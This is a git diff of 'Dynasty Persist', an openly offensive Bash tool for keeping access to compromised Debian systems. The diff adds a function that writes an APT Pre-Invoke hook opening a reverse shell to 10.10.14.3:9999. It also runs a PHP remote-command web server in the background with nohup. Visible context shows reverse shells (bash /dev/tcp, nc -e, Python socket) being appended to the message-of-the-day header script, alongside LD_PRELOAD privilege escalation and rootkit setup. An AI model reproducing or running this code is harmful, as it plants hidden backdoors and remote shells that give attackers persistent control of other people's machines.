@@ -1,14 +1,20 @@
 #!/bin/bash
 
+
 ################################################ 
-#                                              # 
-#             Title: Dynasty Persist           # 
+#                                              #    
+#        Title: Dynasty Persist                #  
 #        Author: Trevohack                     # 
-#        Date: 1.8.2023                        # 
-#        Version: 1.0                          # 
+#        Date: 24.12.2023                      #  
+#        Version: 1.3                          # 
 #                                              # 
 ################################################ 
 
+
+if [ "$#" -ne 2 ]; then
+    echo "Usage: $0 <ip> <port>"
+    exit 1
+fi
 
 ip="$1"
 port="$2"
@@ -147,24 +153,35 @@ configDiamorphine() {
 }
 
 LDPreloadPrivesc() {
+    echo -e "\033[0;32m[+] - LD_PRELOAD Privilege Escalation\n"
     chmod +x preload.sh
     ./preload.sh
+    echo -e "\033[0;32m[+] - Configured!\n"
 }
 
 rcePersistence() {
+    echo -e "\033[0;32m[+] - RCE Persistence\n"
     PORT=9056 
     mkdir /var/www/html/dynasty_rce 
     cp rce.php /var/www/dynasty_rce/rce.php 
     cd /var/www/html/dynasty_rce 
-    php -S 0.0.0.0:$PORT & 
+    nohup php -S 0.0.0.0:$PORT > /dev/null 2>&1 & 
+    echo -e "\033[0;32m[+] - RCE on $PORT\n" 
 }
 
 MessageOfTheDay() {
-    echo -e "\033[0;32m[+] - Linux header / Message Of The Day Persistence"
+    echo -e "\033[0;32m[+] - Linux header / Message Of The Day Persistence\n"
     echo "bash -c 'bash -i >& /dev/tcp/$ip/$port 0>&1'" >> /etc/update-motd.d/00-header 
     echo "nc -e /bin/sh $ip $port" >> /etc/update-motd.d/00-header 
     echo "$python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$ip",$port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'' >> /etc/update-motd.d/00-header"
     echo -e "\033[0;32m[+] - Success!"
+}
+
+backdoorApt() {
+    echo -e "\033[0;32m[+] - Backdoor APT\n"
+    revshell="sh -i >& /dev/tcp/10.10.14.3/9999 0>&1"
+    echo 'APT::Update::Pre-Invoke {"nohup sh -i >& /dev/tcp/10.10.14.3/9999 0>&1 2> /dev/null &"};' > /etc/apt/apt.conf.d/42backdoor 
+    echo -e "\033[0;32m[+] - APT is now spooky!\n"
 }
 
 help() {
@@ -172,6 +189,8 @@ help() {
         ──────────────────────────────────────────────────
             \e[96mD Y N A S T Y  - P E R S I S T\e[0m
         ──────────────────────────────────────────────────
+
+        \e[93m1. [ Tested on Debian Systems ]\e[0m
 
         \e[93m1. Basrc Persistence:\e[0m
         Maintain persistence: When a user authenticates.
@@ -194,14 +213,17 @@ help() {
         \e[93m7. Systemd Service for Root:\e[0m
         Configure root-level service for persistence.
 
-        \e[93m7. LD_PRELOAD Privilege Escalation:\e[0m
+        \e[93m8. LD_PRELOAD Privilege Escalation:\e[0m
         Special Thanks to @MatheuzSec for this.
 
-        \e[93m7. Backdooring Message Of The Day / Linux Header:\e[0m
+        \e[93m9. Backdooring Message Of The Day / Linux Header:\e[0m
         Backdoor the Linux header on 00-header on the update-motd framework
 
-        \e[93m7 Modify A Systemd Service for Persistence:\e[0m
+        \e[93m10. Modify A Systemd Service for Persistence:\e[0m
         Modify a present systemd service for a reverse shell / persistence 
+
+        \e[93m10. Backdoor APT command:\e[0m
+        Backdoors apt command, to pop up a shell 
 
         ───────────────────DYNASTY───────────────────\e[0m"
 
@@ -209,7 +231,7 @@ help() {
 }
 
 main() {
-    echo -e "${MAGENTA}  _             _                   
+    echo -e "${CYAN}  _             _                   
         | \    ._   _.  _ _|_     |_) _  ._ _ o  _ _|_ 
         |_/ \/ | | (_| _>  |_ \/  |  (/_ | _> | _>  |_ 
             /                 /                        
@@ -230,8 +252,10 @@ main() {
        7. Systemd Service for Root    8. LD_PRELOAD Privilege Escalaion Config
        9. Backdooring Message of the Day / Header 
        10. Modify An Existing Systemd Service 
+       11. Backdoor APT
        
        help for more information! 
+       ${RESET}
        "
        read -p "[-{DYNASTY-P3R1ST}-] " input
        if [ "$input" == "1" ]; then
@@ -254,11 +278,14 @@ main() {
            MessageOfTheDay
        elif  [ "$input" == "10" ]; then
            ModServiceOnSystemd 
+        elif  [ "$input" == "11" ]; then
+           backdoorApt
        elif [ "$input" == "help" ] || [ input == "h" ]; then
            help 
        else 
            echo -e "${RED}[ERROR] Invalid command"
         fi
 }
-clear 
+
+clear  
 main
